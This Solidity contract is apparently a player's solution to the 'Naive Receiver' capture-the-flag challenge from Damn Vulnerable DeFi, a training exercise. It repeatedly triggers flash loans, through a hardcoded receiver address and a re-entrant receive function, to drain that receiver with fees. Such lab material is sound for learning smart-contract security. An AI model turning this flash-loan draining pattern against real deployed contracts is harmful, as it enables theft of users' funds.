// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanPlayer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanPlayer is IERC3156FlashBorrower {
    NaiveReceiverLenderPool private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(NaiveReceiverLenderPool _pool) {
        pool = _pool;
    }
    /**
    @notice 
    1) reverts if : 
        pool is not the caller, 
        currency is not ETH

    //  */
    function onFlashLoan(
        // selector signature -> 0x90ed06ae
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly {
            // gas savings
            // will execute if pool is not the caller.
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != ETH) revert UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount;
        }

        _executeActionDuringFlashLoan();

        // call(), reverts if the execution fails
        SafeTransferLib.safeTransferETH(address(pool), amountToBeRepaid);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
        // 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    }

    function firstTimer() public {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            ETH,
            1 ether,
            "0x"
        );
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {
        address reciever = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;

        pool.flashLoan(IERC3156FlashBorrower(reciever), ETH, 1 ether, "0x");
    }

    // Allow deposits of ETH
    receive() external payable {
        if (address(this).balance == 4 ether) {} else {
            pool.flashLoan(
                IERC3156FlashBorrower(address(this)),
                ETH,
                1 ether,
                "0x"
            );
        }
    }
}
